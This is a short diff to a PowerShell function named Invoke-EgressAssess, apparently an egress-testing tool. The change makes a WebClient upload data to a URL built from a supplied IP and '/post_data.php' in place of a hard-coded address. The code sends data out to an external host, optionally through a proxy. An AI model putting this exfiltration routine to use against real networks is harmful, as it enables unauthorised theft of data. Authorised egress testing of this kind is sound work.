@@ -269,8 +269,8 @@ function Invoke-EgressAssess
                 {
                     $Url = "http://" + $IP + "/post_data.php"
                 }
-                #$uri = New-Object -TypeName System.Uri -ArgumentList $Url
-                $uri = New-Object -TypeName System.Uri($Url)
+                $uri = New-Object -TypeName System.Uri -ArgumentList $Url
+                #$uri = New-Object -TypeName System.Uri($Url)
                 $wc = New-Object -TypeName System.Net.WebClient
                 if ($proxy)
                 {
@@ -279,7 +279,7 @@ function Invoke-EgressAssess
                     $wc.proxy = $proxy
                 }
                 Write-Verbose  "Uploading  data..."
-                $wc.UploadString("http://172.20.10.106/", $Data)
+                $wc.UploadString($uri, $Data)
                 $totalupload += $sizedata
                 Write-Verbose "Transaction Complete!"
                 break
